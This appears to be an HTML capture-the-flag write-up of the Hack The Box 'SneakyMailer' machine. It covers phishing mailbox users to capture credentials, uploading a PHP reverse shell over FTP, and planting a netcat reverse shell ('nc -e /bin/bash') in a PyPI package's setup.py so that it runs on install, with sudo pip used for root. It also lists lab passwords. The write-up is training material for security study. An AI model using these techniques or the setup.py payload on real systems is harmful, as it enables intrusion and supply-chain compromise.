@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html>
+
+<style>
+body {
+
+	background-image: url('images/cool-background.png');
+	background-attachment: fixed;
+	color: #333;
+}
+
+</style>
+
+	<head>
+		<title>SneakyMailer Writeup </title>
+
+		<!-- link to main stylesheet -->
+		<link rel="stylesheet" type="css/main.css">
+	</head>
+	<body>
+		<div class="container">
+    		<div class="blurb">
+        		<h1>HTB SneakyMailer</h1>
+				<p>
+				<img src="images/sneaky/sneaky-header.PNG" alt="sneaky" class="inline"/> 							<br/> <br/> <br/>
+
+				We start out with our usual nmap scan -  											<br/> <br/>
+				<img src="images/sneaky/nmap.PNG" alt="nmap" class="inline"/>									<br/> <br/> <br/>
+
+				Initially we can see we have a ftp server, a couple web servers, and an email server. The web server on port 80 has a list of emails. <br/> <br/>
+				<img src="images/sneaky/sneaky-corp-home-page.PNG" alt="emails" class="inline"/> 						<br/> <br/> <br/>
+
+				I ran gobuster and we see a couple standard directories as well as <b> dev.sneakycorp.htb </b>					<br/> <br/>
+				<img src="images/sneaky/gob1.PNG" alt="emails" class="inline"/> 								<br/> <br/> <br/>
+				<img src="images/sneaky/gob2.PNG" alt="emails" class="inline"/> 								<br/> <br/> <br/>
+
+				Sadly <b>dev.sneakycorp.htb</b> appeared to have the same html as the normal sneakycorp.htb domain. I checked out the webapp on port 8080 next. <br/> <br/>
+				<img src="images/sneaky/8080-app.PNG" alt="web app on port 8080" class="inline"/> 						<br/> <br/> <br/>
+
+				Not much to see there so I moved onto the FTP server. FTP appeared to be a dead end since at this point as we don't have 	<br/>
+				any creds and there is no guest access. With nothing but a list of emails and the box being named "sneakymailer", I figured	<br/>
+				a phishing attempt could be worth a shot. Maybe there is a program setup to click on every link for a couple users. 		<br/> <br/>
+
+				I opted to use a tool called swaks - <a href="https://github.com/jetmore/swaks">which you can checkout here</a> 		<br/> <br/>
+
+				I sent out an email to everyone on the list found earlier, with the contents <b>"Checkout our new webserver http://10.10.14.29"</b>.	<br/> <br/>
+				<img src="images/sneaky/swaks.PNG" alt="swaks" class="inline"/>									<br/> <br/> <br/>
+
+				In netcat we see an http connection attempt with the user Paul's creds.								<br/> <br/>
+				<img src="images/sneaky/phished.PNG" alt="phished" class="inline"/> 								<br/> <br/> <br/>
+
+				We can see in the "Content-Type" header that the contents are url encoded.After urldecoding the above password, we get 		<br/> <br/>
+
+				<br/><br/><br/> <code>
+				Username: 	paulbyrd@sneakymailer.htb 		<br/>
+				Password:	^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht 	<br/>
+				</code>  <br/><br/><br/>
+
+				With Paul's creds we can setup an email client and read his emails. I setup Evolution, which you can download with 		<br/><br/><br/><br/>
+
+				<code>
+				apt-get install evolution
+				</code> 															<br/><br/><br/>
+
+				After installing evolution and setting it up with Paul's creds, we are able to see 2 emails in Paul's sent folder. 		<br/><br/>
+				Email #1 is a set of credentials for the developer user 									<br/><br/>
+				<img src="images/sneaky/smtp-creds.PNG" alt="Paul's emails" class="inline"/> 							<br/><br/><br/>
+
+				Email #2 tells us that <b>all of the packages in pypi are ran and tested by the low user</b>. This may come in handy later if we need to pivot to the low user. 	<br/> <br/>										<br/> <br/>
+				<img src="images/sneaky/smtp-info.PNG" alt="Paul's emails" class="inline"/> 							<br/> <br/> <br/>
+
+				Our creds list is now -
+
+				<br/><br/><br/> <code>
+				(smtp)							<br/>
+				Username: 	paulbyrd@sneakymailer.htb 		<br/>
+				Password:	^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht		<br/><br/>
+
+				(user acct)						<br/>
+				Username: 	developer				<br/>
+				Password: 	m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C	<br/><br/>
+				</code>							<br/><br/><br/>
+
+				We can log into the FTP server with the developer creds. There is a /dev/ directory that appears to be the same directory that 		<br/>
+				is served on <b> dev.sneakycorp.htb </b>. in theory we should be able to drop a reverse shell in /dev/, and request that page in our	<br/>
+				browser to trigger the reverse connection back to our machine. 										<br/><br/><br/>
+
+				I opted to use the php reverse shell from pentest monkey - <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">which you can checkout here</a> <br/> <br/>
+
+				Uploading to the FTP server - 													<br/> <br/>
+				<img src="images/sneaky/ftp.PNG" alt="uploading rev shell over ftp" class="inline"/> 						<br/> <br/> <br/>
+
+				After requesting the page in our browser we receive a connection back to our netcat listener					<br/> <br/>
+				<img src="images/sneaky/low-priv.PNG" alt="foothold" class="inline"/> 								<br/> <br/> <br/>
+
+				We caught a shell as www-data. We can su over to the developer user, but we are still unable to read user.txt, as it is	owned by user	<br/>
+				low. To get a better idea of the system I ran the linux smart enumeration script (lse.sh), which found an open .htpasswd file for 	<br/>
+				<b> pypi.sneakycorp.htb</b>. This was a bit strange as we have not seen this domain yet. 					<br/> <br/>
+				<img src="images/sneaky/pypi-creds.PNG" alt=".htpasswd creds" class="inline"/> 							<br/> <br/> <br/>
+
+				Some further enumeration revealed this to be the port 8080 application that we were previously unable to see. 			<br/> <br/>
+				<img src="images/sneaky/pypi-home-page.PNG" alt="port 8080 web app" class="inline"/> 						<br/> <br/> <br/>
+
+				Remembering back to our 2nd email we discovered in Paul's sent folder, <b>every package in here is executed by the low user</b>.<br/>
+				Our goal is to figure out how to upload a package such that we catch a shell from low when it gets tested.			<br/> <br/>
+				First step is to crack the hash from .htpasswd. We can determine the generic hash type from hash-identifier 			<br/> <br/>
+				<img src="images/sneaky/pypi-creds2.PNG" alt="pypi" class="inline"/> 								<br/> <br/> <br/>
+
+				We can then find the actual hash type on the hashcat page <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">which you can checkout here</a>, and then attempt to crack it 					<br/> <br/>
+				<img src="images/sneaky/pypi-creds3.PNG" alt="pypi" class="inline"/> 								<br/> <br/> <br/>
+				<img src="images/sneaky/pypi-creds4.PNG" alt="pypi" class="inline"/> 								<br/> <br/> <br/>
+
+				Hashcat cracks it, and we can update our creds list  										<br/> <br/
+
+				<br/><br/><br/> <code>
+				(smtp)							<br/>
+				Username: 	paulbyrd@sneakymailer.htb 		<br/>
+				Password:	^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht		<br/><br/>
+
+				(user acct)						<br/>
+				Username: 	developer				<br/>
+				Password: 	m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C	<br/><br/>
+
+				(pypi creds)						<br/>
+				username: 	pypi					<br/>
+ 				password:	soufianeelhaoui				<br/><br/>
+				</code><br/><br/><br/>
+
+				Now that we have pypi creds, we turn to the pypi documentation to figure out how to upload a package. There are 2 files we need to setup.<br/>												<br/>
+
+				<u1>
+					<li> <b>.pypirc</b> -- config</li>
+					<li> <b>setup.py</b> -- build script</li>
+				</u1>																<br/><br/><br/>
+
+
+				<i>example .pypirc from pypi docs</i>												<br/>
+				<img src="images/sneaky/pypi-setup2.PNG" alt="pypi docs" class="inline"/>							<br/><br/><br/>
+
+				<i>example setup.py from pypi docs</i>												<br/>
+				<img src="images/sneaky/pypi-setup1.PNG" alt="pypi docs" class="inline"/>							<br/><br/><br/>
+
+				We can setup a pypirc with the connection info and creds we already have.							<br/><br/>
+				<img src="images/sneaky/pypirc.PNG" alt="pypirc" class="inline"/>								<br/><br/><br/>
+
+				Inside of setup.py, we can a simple netcat one liner to send a /bin/bash session back to our kali.				<br/><br/><br/>
+
+				<code>
+				nc -e /bin/bash (my-ip-goes-here) (my-port-goes-here)
+				</code>  <br/><br/><br/>
+
+				I created my setup.py like below												<br/><br/>
+				<img src="images/sneaky/setup-initial.PNG" alt="setup.py" class="inline"/>							<br/><br/><br/>
+
+				At this point uploading a pypi package with the above two files results in catching yet another shell as the dev user.		<br/>
+				The whole point of doing this was to pivot to the low user, and he should be executing these packages according to the email 	<br/>
+				we read earlier. So what is going on?												<br/><br/><br/>
+
+				<b>When we upload a package our setup.py code is actually ran twice</b>. It is ran the first time by us executing the upload		<br/>
+				on sneakymailer as the developer user. Then it is ran a 2nd time when the low user grabs and executes it. Our nc one liner is		<br/>
+				getting executed by the dev user first, and then we arent able to see the connection attempt from low. We can do a simple os.getuid() 	<br/>
+				check in the setup.py script to see if we are executing as dev or low, if we match low's UID run nc, otherwise do nothing. 		<br/><br/>
+
+				We can see user lows uid in /etc/passwd												<br/><br/>
+				<img src="images/sneaky/etc-passwd.PNG" alt="/etc/passwd" class="inline"/>							<br/><br/><br/>
+
+				So I edited setup.py to check for uuid == 1000											<br/><br/>
+				<img src="images/sneaky/setup-py.PNG" alt="setup.py" class="inline"/>								<br/><br/><br/>
+
+				I transferred setup.py and .pypirc over into the /tmp/ directory. After starting up my netcat listener, I uploaded the package	<br/><br/>
+				<img src="images/sneaky/pypi.PNG" alt="pypi package upload" class="inline"/>							<br/><br/><br/>
+
+				We got a 200 status OK, and over in nc												<br/><br/>
+				<img src="images/sneaky/user-txt.PNG" alt="low priv shell" class="inline"/>							<br/><br/><br/><br/>
+
+				<h2> Privesc </h2>
+
+				User low has sudo permissions on pip3												<br/><br/>
+				<img src="images/sneaky/sudo-perms.PNG" alt="pip sudo perms" class="inline"/>							<br/><br/><br/>
+
+				Lucky for us, gtfobins has a couple one liners for pip that should work. 							<br/>
+				<a href="https://gtfobins.github.io/gtfobins/pip/">You can checkout the full gtfobins page on pip here</a> 			<br/><br/>
+
+				<img src="images/sneaky/gtfo-bins.PNG" alt="pip gtfobin" class="inline"/>							<br/><br/><br/>
+
+				We can simply copy the commands over into our session on sneakymailer								<br/><br/>
+				<img src="images/sneaky/root.PNG" alt="root" class="inline"/>									<br/><br/><br/>
+
+				<b> Thanks for reading!!! </b>												<br/> <br/><br/> <br/><br/> <br/>
+
+			  	</p>
+    		</div><!-- /.blurb -->
+		<div class="blurb">
+		</div><!-- /.container -->
+
+	</body>
+</html>
